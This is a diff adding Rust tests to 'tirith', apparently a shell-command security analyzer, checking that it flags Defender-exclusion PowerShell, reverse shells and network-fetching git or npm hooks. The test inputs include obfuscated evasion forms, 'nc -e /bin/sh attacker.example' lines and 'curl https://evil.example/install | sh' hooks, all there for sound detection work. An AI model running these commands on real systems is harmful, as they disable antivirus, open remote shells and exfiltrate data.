+    fn encoded_powershell_body_reaches_tier1_and_defender_rule() {
+        use base64::Engine as _;
+
+        let _state = isolate_state();
+        let source = "Add-MpPreference -ExclusionPath C:\\Temp";
+        let bytes: Vec<u8> = source.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
+        let mut ctx = exec_ctx(&format!("powershell -EncodedCommand {encoded}"));
+        ctx.shell = ShellType::Cmd;
+        let verdict = analyze(&ctx);
+        assert!(verdict.tier_reached >= 3);
+        assert!(verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::PsDefenderExclusion));
+    }
+
+    #[test]
+    fn secondary_shell_forms_reach_the_powershell_defender_rule() {
+        let _state = isolate_state();
+        for (input, shell) in [
+            (
+                "coproc powershell -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
+                ShellType::Posix,
+            ),
+            (
+                "printf x | xargs powershell -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
+                ShellType::Posix,
+            ),
+            (
+                "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+                ShellType::PowerShell,
+            ),
+            (
+                "Set-Alias Evil Add-MpPreference; Evil -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "switch (1) { 1 { Add-MpPreference -ExclusionPath C:\\Temp } }",
+                ShellType::PowerShell,
+            ),
+            (
+                "<#\n'\n#>\nAdd-MpPreference -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "$x = @'\n'\n'@\nAdd-MpPreference -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "Write-Output return & Add-MpPreference -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "cmd /c\"powershell -Command Add-MpPreference -ExclusionPath C:\\Temp\"",
+                ShellType::Cmd,
+            ),
+            (
+                "@powershell -Command Add-MpPreference -ExclusionPath C:\\Temp",
+                ShellType::Cmd,
+            ),
+            (
+                "for /f \"delims=\" %i in ('powershell -Command Add-MpPreference -ExclusionPath C:\\Temp') do @echo %i",
+                ShellType::Cmd,
+            ),
+            (
+                "rem \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp",
+                ShellType::Cmd,
+            ),
+        ] {
+            let mut ctx = exec_ctx(input);
+            ctx.shell = shell;
+            let verdict =
+                analyze_inner_with_policy(&ctx, false, Some(&Policy::default()), true).0;
+            assert!(
+                verdict.findings.iter().any(|finding| {
+                    finding.rule_id == crate::verdict::RuleId::PsDefenderExclusion
+                }),
+                "secondary executable body escaped: {input:?} -> {:?}",
+                verdict.findings
+            );
+        }
+    }
+
     /// Build a Paste context whose cwd is `dir` (for policy + repo-root
     /// discovery). Mirrors [`exec_ctx_in`] but in `ScanContext::Paste`.
     fn paste_ctx_in(input: &str, dir: &std::path::Path) -> AnalysisContext {
@@ -4600,7 +5498,13 @@ mod tests {
             .iter()
             .map(|(name, _)| (*name, std::env::var_os(name)))
             .collect::<Vec<_>>();
-        for name in ["TIRITH_POLICY_ROOT", "TIRITH_SERVER_URL", "TIRITH_API_KEY"] {
+        for name in [
+            "TIRITH_POLICY_ROOT",
+            "TIRITH_SERVER_URL",
+            "TIRITH_API_KEY",
+            "TIRITH_ALLOW_HTTP",
+            "TIRITH",
+        ] {
             previous_env.push((name, std::env::var_os(name)));
         }
         // SAFETY: serialized by TEST_ENV_LOCK held above.
@@ -4608,7 +5512,13 @@ mod tests {
             for (name, path) in &isolated {
                 std::env::set_var(name, path);
             }
-            for name in ["TIRITH_POLICY_ROOT", "TIRITH_SERVER_URL", "TIRITH_API_KEY"] {
+            for name in [
+                "TIRITH_POLICY_ROOT",
+                "TIRITH_SERVER_URL",
+                "TIRITH_API_KEY",
+                "TIRITH_ALLOW_HTTP",
+                "TIRITH",
+            ] {
                 std::env::remove_var(name);
             }
         }
@@ -4617,6 +5527,67 @@ mod tests {
             previous_env,
             _lock: lock,
         }
+    }
+
+    #[test]
+    fn clean_and_bypass_paths_honor_effective_policy_failure_mode() {
+        let isolated = isolate_state();
+        let org_root = isolated._tmp.path().join("org-policy");
+        std::fs::create_dir_all(org_root.join(".tirith")).unwrap();
+        std::fs::write(
+            org_root.join(".tirith/policy.yaml"),
+            "policy_server_url: http://127.0.0.1:1\n\
+             policy_server_api_key: inert-test-key\n\
+             policy_fetch_fail_mode: closed\n\
+             allow_bypass_env: true\n",
+        )
+        .unwrap();
+        // The literal loopback destination is rejected by URL policy before any
+        // socket is opened, so this exercises remote failure hermetically.
+        unsafe {
+            std::env::set_var("TIRITH_POLICY_ROOT", &org_root);
+            std::env::set_var("TIRITH_ALLOW_HTTP", "1");
+        }
+
+        let clean = analyze(&exec_ctx_in("whoami", isolated._tmp.path()));
+        assert_eq!(clean.action, crate::verdict::Action::Block);
+        assert!(clean.findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::CustomRuleMatch
+                && finding.custom_rule_id.as_deref() == Some("tirith-effective-policy-unavailable")
+        }));
+
+        unsafe { std::env::set_var("TIRITH", "0") };
+        let bypass = analyze(&exec_ctx_in("whoami", isolated._tmp.path()));
+        assert!(bypass.bypass_requested);
+        assert!(!bypass.bypass_honored);
+        assert_eq!(bypass.action, crate::verdict::Action::Block);
+    }
+
+    #[test]
+    fn honored_interactive_bypass_retains_available_evidence_for_execution_drafts() {
+        let isolated = isolate_state();
+        let context = exec_ctx_in("TIRITH=0 true", isolated._tmp.path());
+
+        let (verdict, _partial_policy) = analyze_returning_policy(&context);
+
+        assert!(verdict.bypass_requested);
+        assert!(verdict.bypass_available);
+        assert!(verdict.bypass_honored);
+        let (full_verdict, full_policy) = analyze_force_full_returning_policy(&context);
+        assert!(full_verdict.bypass_requested);
+        assert!(full_verdict.bypass_available);
+        assert!(full_verdict.bypass_honored);
+        crate::execution_state::prepare_execution(
+            &full_verdict,
+            &full_policy,
+            &context.input,
+            "engine-bypass-receipt",
+            crate::escalation::CallerContext::Cli,
+            context.shell,
+            crate::execution_state::DEFAULT_DRAFT_TTL,
+            crate::execution_state::DEFAULT_GATE_LOCK_TIMEOUT,
+        )
+        .expect("an honored bypass must form a consistent execution draft");
     }
 
     /// CodeRabbit R3 #1: a supplied card ref with an unresolvable trusted-keys dir
@@ -4848,6 +5819,21 @@ mod tests {
             "with exec_guard_enabled=true a /tmp leader must fire ExecInTmp, got {:?}",
             on.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
         );
+
+        for nested in [
+            "echo $(/tmp/payload-xyz-9999 --do-thing)",
+            "sh -c '/tmp/payload-xyz-9999 --do-thing'",
+        ] {
+            let verdict = analyze(&exec_ctx_in(nested, on_dir.path()));
+            assert!(
+                verdict
+                    .findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::ExecInTmp),
+                "nested executable provenance escaped: {nested} -> {:?}",
+                verdict.findings
+            );
+        }
     }
 
     // ── M11 ch2: repo command manifest (`.tirith/commands.yaml`) ──────────────
@@ -4948,6 +5934,33 @@ mod tests {
             .expect("dangerous pattern finding should be present");
         assert_eq!(dangerous.severity, Severity::High);
         assert_eq!(verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn manifest_dangerous_pattern_applies_to_nested_executable_body() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        use crate::verdict::{Action, RuleId, Severity};
+
+        let dir = tempfile::tempdir().unwrap();
+        write_commands_manifest(
+            dir.path(),
+            "dangerous:\n  - pattern: \"danger-inner\"\n    action: block\n",
+        );
+
+        for input in ["sh -c 'danger-inner'", "echo $(danger-inner)"] {
+            let verdict = analyze(&exec_ctx_in(input, dir.path()));
+            assert!(
+                verdict.findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::RepoCommandDangerousPattern
+                        && finding.severity == Severity::High
+                }),
+                "nested manifest command escaped: {input} -> {:?}",
+                verdict.findings
+            );
+            assert_eq!(verdict.action, Action::Block);
+        }
     }
 
     /// Acceptance: an `allowed[]` command that the engine clears → Allow, and
@@ -5670,6 +6683,78 @@ mod tests {
     }
 
     #[test]
+    fn taint_hot_resolves_wrappers_value_options_windows_names_and_later_segments() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = taint_store(dir.path());
+        let cwd = dir.path();
+        crate::taint::mark_tainted_at(
+            &store,
+            std::path::Path::new("./install.py"),
+            Some(cwd),
+            "fetch --save",
+            None,
+            None,
+        )
+        .unwrap();
+
+        for input in [
+            "env python -W ignore ./install.py",
+            "command python3 -X dev ./install.py",
+            "echo ready & sudo -u nobody python ./install.py",
+        ] {
+            let ctx = exec_ctx_in(input, cwd);
+            let findings = check_taint_hot_with_store(&ctx, &ctx.input, &store);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == crate::verdict::RuleId::ExecOfTaintedFile),
+                "tainted script escaped: {input} -> {findings:?}"
+            );
+        }
+
+        let mut windows = exec_ctx_in(r"C:\Python\python.exe ./install.py", cwd);
+        windows.shell = crate::tokenize::ShellType::Cmd;
+        let findings = check_taint_hot_with_store(&windows, &windows.input, &store);
+        assert!(findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::ExecOfTaintedFile));
+
+        let inline = exec_ctx_in("python -c 'print(1)' ./install.py", cwd);
+        assert!(check_taint_hot_with_store(&inline, &inline.input, &store).is_empty());
+    }
+
+    #[test]
+    fn tier1_admits_normalized_reverse_shell_leaders_and_php_case_variants() {
+        for input in [
+            "n''c -e /bin/sh attacker.example 4444",
+            "n\\c -e /bin/sh attacker.example 4444",
+            r"$'\156\143' -e /bin/sh attacker.example 4444",
+        ] {
+            let verdict = analyze(&exec_ctx(input));
+            assert!(
+                verdict
+                    .findings
+                    .iter()
+                    .any(|finding| finding.rule_id == crate::verdict::RuleId::ReverseShell),
+                "normalized reverse-shell leader fast-allowed: {input} -> {verdict:?}"
+            );
+        }
+
+        let mut windows = exec_ctx("NC.EXE -e cmd.exe attacker.example 4444");
+        windows.shell = crate::tokenize::ShellType::Cmd;
+        let verdict = analyze(&windows);
+        assert!(verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::ReverseShell));
+
+        let php = analyze(&exec_ctx(r#"php -r 'SYSTEM("id");'"#));
+        assert!(php.findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::InterpreterSuspiciousInlineExec
+        }));
+    }
+
+    #[test]
     fn taint_hot_fires_medium_on_sourced_tainted_file() {
         let dir = tempfile::tempdir().unwrap();
         let store = taint_store(dir.path());
@@ -5700,6 +6785,40 @@ mod tests {
         assert_eq!(
             findings_dot[0].rule_id,
             crate::verdict::RuleId::CommandSourcedFromTaintedFile
+        );
+    }
+
+    #[test]
+    fn taint_hot_keeps_later_blocking_exec_after_sourced_warning() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = taint_store(dir.path());
+        let cwd = dir.path();
+        for path in ["./env.sh", "./payload"] {
+            crate::taint::mark_tainted_at(
+                &store,
+                std::path::Path::new(path),
+                Some(cwd),
+                "fetch --save",
+                None,
+                None,
+            )
+            .unwrap();
+        }
+
+        let ctx = exec_ctx_in("source ./env.sh && ./payload", cwd);
+        let findings = check_taint_hot_with_store(&ctx, &ctx.input, &store);
+        assert!(findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::CommandSourcedFromTaintedFile
+                && finding.severity == crate::verdict::Severity::Medium
+        }));
+        assert!(findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::ExecOfTaintedFile
+                && finding.severity == crate::verdict::Severity::High
+        }));
+        assert_eq!(
+            crate::verdict::action_from_findings(&findings),
+            crate::verdict::Action::Block,
+            "an earlier sourced-file warning must not hide a later tainted execution"
         );
     }
 
@@ -5741,8 +6860,8 @@ mod tests {
         // CodeRabbit R6 #2: the leader-based hot checks must operate on the
         // prelude-STRIPPED command, not the raw `# tirith-card:` marker line.
         // The engine threads `analyzed_input` (the stripped command) into
-        // `check_taint_hot_with_store`; this test pins both directions of that
-        // contract at the helper level.
+        // `check_taint_hot_with_store`; this test pins that production path and
+        // the tokenizer's comment-aware defense in depth at the helper level.
         let dir = tempfile::tempdir().unwrap();
         let store = taint_store(dir.path());
         let cwd = dir.path();
@@ -5770,13 +6889,20 @@ mod tests {
         );
         assert_eq!(fired[0].rule_id, crate::verdict::RuleId::ExecOfTaintedFile);
 
-        // Passing the RAW marker-prefixed input instead keys off the `#` comment
-        // line (leader is `#`, not the interpreter), so NOTHING fires — exactly
-        // the bug this finding fixes. (Demonstrates why the stripping matters.)
+        // The tokenizer also ignores comment-only segments, so defense-in-depth
+        // analysis of the raw representation must reach the same real command.
         let raw = check_taint_hot_with_store(&ctx, &ctx.input, &store);
+        assert_eq!(
+            raw.len(),
+            1,
+            "a raw card-comment prelude must not mask the tainted execution"
+        );
+        assert_eq!(raw[0].rule_id, crate::verdict::RuleId::ExecOfTaintedFile);
+
+        let marker_only = exec_ctx_in("# tirith-card: ./card.json", cwd);
         assert!(
-            raw.is_empty(),
-            "raw marker-line input must NOT resolve the real leader (pre-fix behavior)"
+            check_taint_hot_with_store(&marker_only, &marker_only.input, &store).is_empty(),
+            "the card metadata line alone must not be treated as executable"
         );
     }
 
@@ -5790,11 +6916,385 @@ mod tests {
             leader_is_hook_triggering(&ctx, &stripped),
             "the stripped command's leader (git commit) must be hook-triggering"
         );
-        // The raw marker line is not a hook-triggering leader.
+        // Comment-aware tokenization is defense in depth: even an accidental
+        // raw call must skip the metadata and still identify `git commit`.
         assert!(
-            !leader_is_hook_triggering(&ctx, &ctx.input),
-            "the raw `# tirith-card:` line must not be seen as a hook-triggering leader"
+            leader_is_hook_triggering(&ctx, &ctx.input),
+            "a raw card-comment prelude must not mask a hook-triggering command"
         );
+
+        let marker_only = exec_ctx("# tirith-card: ./card.json");
+        assert!(
+            !leader_is_hook_triggering(&marker_only, &marker_only.input),
+            "the card metadata line alone must not be hook-triggering"
+        );
+
+        let cross_shell = exec_ctx("pwsh -Command 'npm install'");
+        assert!(
+            leader_is_hook_triggering(&cross_shell, &cross_shell.input),
+            "a nested lifecycle command must be parsed with its child shell"
+        );
+    }
+
+    #[test]
+    fn unresolved_env_split_wrapper_forces_hook_guard_and_blocks() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        let ctx = exec_ctx_in(r"env -S '${OPT}'", root.path());
+        let (_, extraction_incomplete) = collect_nested_executable_inputs(&ctx.input, ctx.shell);
+        assert!(
+            extraction_incomplete,
+            "the canonical executable-body scanner must retain unresolved wrappers as a gap"
+        );
+
+        assert!(
+            leader_is_hook_triggering(&ctx, &ctx.input),
+            "a recognized wrapper with a runtime-selected command must force the hook guard"
+        );
+        let direct = check_repo_hooks_hot(&ctx, &ctx.input);
+        let incomplete = direct
+            .iter()
+            .find(|finding| {
+                finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                    && finding.severity == crate::verdict::Severity::High
+            })
+            .expect("an unresolved wrapper must surface a blocking coverage gap");
+        assert_eq!(
+            incomplete.title,
+            "Automatic repo hook state could not be inspected"
+        );
+        assert!(incomplete.description.contains("blocked"));
+
+        let policy = Policy {
+            hooks_guard_enabled: true,
+            ..Policy::default()
+        };
+        let verdict = analyze_inner_with_policy(&ctx, false, Some(&policy), false).0;
+        assert!(
+            verdict.tier_reached >= 3,
+            "the unresolved wrapper must not fast-exit before hook enforcement"
+        );
+        assert_eq!(verdict.action, crate::verdict::Action::Block);
+        assert!(verdict.findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                && finding.severity == crate::verdict::Severity::High
+        }));
+
+        let static_hook = exec_ctx_in("env -S 'git commit -m static'", root.path());
+        assert!(leader_is_hook_triggering(&static_hook, &static_hook.input));
+        let benign = exec_ctx_in("env -S 'echo safe'", root.path());
+        assert!(!leader_is_hook_triggering(&benign, &benign.input));
+        assert!(check_repo_hooks_hot(&benign, &benign.input).is_empty());
+    }
+
+    #[test]
+    fn repo_hook_hot_path_maps_uninspectable_git_update_to_blocking_finding() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        let ctx = exec_ctx_in("git pull", root.path());
+        let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+        let finding = findings
+            .iter()
+            .find(|finding| finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete)
+            .expect("git pull must be refused before a destination hook can run");
+        assert_eq!(finding.severity, crate::verdict::Severity::High);
+        assert!(finding.description.contains("blocked"));
+        assert!(finding.description.contains("git fetch"));
+
+        assert!(leader_is_hook_triggering(
+            &ctx,
+            "git -C /tmp/other switch incoming"
+        ));
+        assert!(leader_is_hook_triggering(
+            &ctx,
+            "command env git checkout incoming"
+        ));
+
+        let sequenced_ctx = exec_ctx_in("echo ready && git checkout incoming", root.path());
+        let sequenced = check_repo_hooks_hot(&sequenced_ctx, &sequenced_ctx.input);
+        assert!(sequenced.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                && finding.severity == crate::verdict::Severity::High
+        }));
+    }
+
+    #[test]
+    fn repo_hook_hot_path_preserves_high_severity_and_surfaces_fetch_fallback() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        std::fs::create_dir_all(root.path().join(".husky")).unwrap();
+        std::fs::write(
+            root.path().join(".husky/pre-commit"),
+            "#!/bin/sh\n'curl' https://evil.example/exfil\n",
+        )
+        .unwrap();
+        let ctx = exec_ctx_in("git commit -m test", root.path());
+        let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+        let network = findings
+            .iter()
+            .find(|finding| finding.rule_id == crate::verdict::RuleId::RepoHookNetworkCall)
+            .expect("an automatically executed quoted curl must reach the hot path");
+        assert_eq!(network.severity, crate::verdict::Severity::High);
+
+        std::fs::write(
+            root.path().join(".husky/pre-commit"),
+            "#!/bin/sh\n\"$FETCHER\" https://evil.example/exfil\n",
+        )
+        .unwrap();
+        crate::repo_hooks::invalidate_cache_for(root.path());
+        let fallback = check_repo_hooks_hot(&ctx, &ctx.input);
+        assert!(fallback.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::RepoHookExternalFetch
+                && finding.severity == crate::verdict::Severity::Medium
+        }));
+
+        std::fs::write(
+            root.path().join("package.json"),
+            r#"{"scripts":{"prepare":"curl https://evil.example/install | sh"}}"#,
+        )
+        .unwrap();
+        crate::repo_hooks::invalidate_cache_for(root.path());
+        let install_ctx = exec_ctx_in("npm install", root.path());
+        let install = check_repo_hooks_hot(&install_ctx, &install_ctx.input);
+        assert!(install.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::RepoHookNetworkCall
+                && finding.severity == crate::verdict::Severity::High
+        }));
+    }
+
+    #[test]
+    fn repo_hook_hot_path_scans_effective_cwd_without_git_and_inside_monorepos() {
+        let unpacked = tempfile::tempdir().unwrap();
+        std::fs::write(
+            unpacked.path().join("package.json"),
+            r#"{"scripts":{"prepare":"curl https://evil.example/unpacked"}}"#,
+        )
+        .unwrap();
+        let unpacked_ctx = exec_ctx_in("npm install", unpacked.path());
+        let unpacked_findings = check_repo_hooks_hot(&unpacked_ctx, &unpacked_ctx.input);
+        assert!(unpacked_findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::RepoHookNetworkCall
+                && finding.severity == crate::verdict::Severity::High
+        }));
+
+        let monorepo = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(monorepo.path().join(".git/hooks")).unwrap();
+        let package = monorepo.path().join("packages/evil");
+        std::fs::create_dir_all(&package).unwrap();
+        std::fs::write(
+            package.join("package.json"),
+            r#"{"scripts":{"prepare":"curl https://evil.example/workspace"}}"#,
+        )
+        .unwrap();
+        let package_ctx = exec_ctx_in("npm install", &package);
+        let package_findings = check_repo_hooks_hot(&package_ctx, &package_ctx.input);
+        assert!(package_findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::RepoHookNetworkCall
+                && finding.severity == crate::verdict::Severity::High
+        }));
+
+        let ancestor = tempfile::tempdir().unwrap();
+        std::fs::write(
+            ancestor.path().join("package.json"),
+            r#"{"scripts":{"prepare":"curl https://evil.example/ancestor"}}"#,
+        )
+        .unwrap();
+        let nested_cwd = ancestor.path().join("src/nested");
+        std::fs::create_dir_all(&nested_cwd).unwrap();
+        let ancestor_ctx = exec_ctx_in("npm install", &nested_cwd);
+        let ancestor_findings = check_repo_hooks_hot(&ancestor_ctx, &ancestor_ctx.input);
+        assert!(ancestor_findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::RepoHookNetworkCall
+                && finding.severity == crate::verdict::Severity::High
+        }));
+
+        let workspace = tempfile::tempdir().unwrap();
+        std::fs::write(
+            workspace.path().join("pnpm-workspace.yaml"),
+            "packages:\n  - packages/*\n",
+        )
+        .unwrap();
+        let child = workspace.path().join("packages/child");
+        let sibling = workspace.path().join("packages/sibling");
+        std::fs::create_dir_all(&child).unwrap();
+        std::fs::create_dir_all(&sibling).unwrap();
+        std::fs::write(child.join("package.json"), r#"{"scripts":{}}"#).unwrap();
+        std::fs::write(
+            sibling.join("package.json"),
+            r#"{"scripts":{"prepare":"curl https://evil.example/sibling"}}"#,
+        )
+        .unwrap();
+        let workspace_ctx = exec_ctx_in("pnpm install", &child);
+        let workspace_findings = check_repo_hooks_hot(&workspace_ctx, &workspace_ctx.input);
+        assert!(workspace_findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                && finding.severity == crate::verdict::Severity::High
+                && finding.description.contains("workspaces")
+        }));
+    }
+
+    #[test]
+    fn repo_hook_hot_path_blocks_nested_lifecycle_commands() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        for command in [r#"echo "$(git commit -m nested)""#, "sh -c 'npm install'"] {
+            let ctx = exec_ctx_in(command, root.path());
+            assert!(leader_is_hook_triggering(&ctx, &ctx.input));
+            let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+            assert!(findings.iter().any(|finding| {
+                finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                    && finding.severity == crate::verdict::Severity::High
+            }));
+        }
+    }
+
+    #[test]
+    fn repo_hook_hot_path_blocks_git_environment_context_overrides() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        for command in [
+            "GIT_DIR=../other/.git git commit -m test",
+            "GIT_CONFIG_PARAMETERS=core.hooksPath=../hooks git commit -m test",
+            "env GIT_WORK_TREE=../other git commit -m test",
+            "env -S 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=../hooks git commit -m test'",
+        ] {
+            let ctx = exec_ctx_in(command, root.path());
+            assert!(leader_is_hook_triggering(&ctx, &ctx.input));
+            let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+            assert!(findings.iter().any(|finding| {
+                finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                    && finding.severity == crate::verdict::Severity::High
+                    && finding.description.contains("GIT_")
+            }));
+        }
+
+        let environment = crate::rules::command::EffectiveEnvironment::default();
+        assert!(environment_redirects_git_context_with_ambient(
+            &environment,
+            &["GIT_CONFIG_PARAMETERS".to_string()]
+        ));
+        let mut explicitly_unset = crate::rules::command::EffectiveEnvironment::default();
+        explicitly_unset.values.insert(
+            "GIT_CONFIG_PARAMETERS".to_string(),
+            crate::rules::command::EffectiveEnvironmentValue::Unset,
+        );
+        assert!(!environment_redirects_git_context_with_ambient(
+            &explicitly_unset,
+            &["GIT_CONFIG_PARAMETERS".to_string()]
+        ));
+
+        assert!(is_git_context_environment_name("git_dir"));
+        let mut differently_cased_unset = crate::rules::command::EffectiveEnvironment::default();
+        differently_cased_unset.values.insert(
+            "git_dir".to_string(),
+            crate::rules::command::EffectiveEnvironmentValue::Unset,
+        );
+        #[cfg(not(windows))]
+        assert!(environment_redirects_git_context_with_ambient(
+            &differently_cased_unset,
+            &["GIT_DIR".to_string()]
+        ));
+        #[cfg(windows)]
+        assert!(!environment_redirects_git_context_with_ambient(
+            &differently_cased_unset,
+            &["GIT_DIR".to_string()]
+        ));
+    }
+
+    #[test]
+    fn repo_hook_hot_path_blocks_wrapper_and_package_environment_redirects() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::write(root.path().join("package.json"), r#"{"scripts":{}}"#).unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        for command in [
+            "env -C ../other npm install",
+            "sudo npm install",
+            "sudo -D ../other git commit -m test",
+        ] {
+            let ctx = exec_ctx_in(command, root.path());
+            let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+            assert!(findings.iter().any(|finding| {
+                finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                    && finding.severity == crate::verdict::Severity::High
+                    && finding.description.contains("execution")
+            }));
+        }
+
+        for command in [
+            "NPM_CONFIG_WORKSPACE=child npm install",
+            "env -u HOME npm install",
+            "PROJECT_CWD=../other yarn install",
+        ] {
+            let ctx = exec_ctx_in(command, root.path());
+            let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+            assert!(findings.iter().any(|finding| {
+                finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                    && finding.severity == crate::verdict::Severity::High
+                    && finding.description.contains("environment")
+            }));
+        }
+
+        let mut package_environment = crate::rules::command::EffectiveEnvironment::default();
+        package_environment.values.insert(
+            "HOME".to_string(),
+            crate::rules::command::EffectiveEnvironmentValue::Unset,
+        );
+        assert!(environment_redirects_package_context_with_ambient(
+            &package_environment,
+            &[]
+        ));
+
+        let path_ctx = exec_ctx_in("PATH=/tmp git commit -m test", root.path());
+        let path_findings = check_repo_hooks_hot(&path_ctx, &path_ctx.input);
+        assert!(path_findings.iter().any(|finding| {
+            finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete
+                && finding.severity == crate::verdict::Severity::High
+                && finding
+                    .description
+                    .contains("runtime Git executable or PATH")
+        }));
+    }
+
+    #[test]
+    fn repo_hook_hot_path_normalizes_executable_quotes_and_escapes_before_routing() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
+        std::fs::create_dir_all(root.path().join(".husky")).unwrap();
+        std::fs::write(
+            root.path().join(".husky/pre-commit"),
+            "#!/bin/sh\ncurl https://evil.example/git\n",
+        )
+        .unwrap();
+        std::fs::write(
+            root.path().join("package.json"),
+            r#"{"scripts":{"prepare":"curl https://evil.example/package"}}"#,
+        )
+        .unwrap();
+        std::fs::write(
+            root.path().join(".envrc"),
+            "curl https://evil.example/direnv\n",
+        )
+        .unwrap();
+
+        for command in [
+            "g''it commit -m test",
+            r"g\it commit -m test",
+            "env g''it commit -m test",
+            "n''pm i''nstall",
+            r"command n\pm in\stall",
+            "direnv a''llow",
+            r"env dir\env re\load",
+        ] {
+            let ctx = exec_ctx_in(command, root.path());
+            assert!(leader_is_hook_triggering(&ctx, &ctx.input), "{command}");
+            let findings = check_repo_hooks_hot(&ctx, &ctx.input);
+            assert!(
+                findings.iter().any(|finding| {
+                    finding.rule_id == crate::verdict::RuleId::RepoHookNetworkCall
+                }),
+                "normalized lifecycle command must scan its executable state: {command}: {findings:?}"
+            );
+        }
     }
 
     // ---- M11 ch3 — canary / honeytoken wiring tests ------------------------
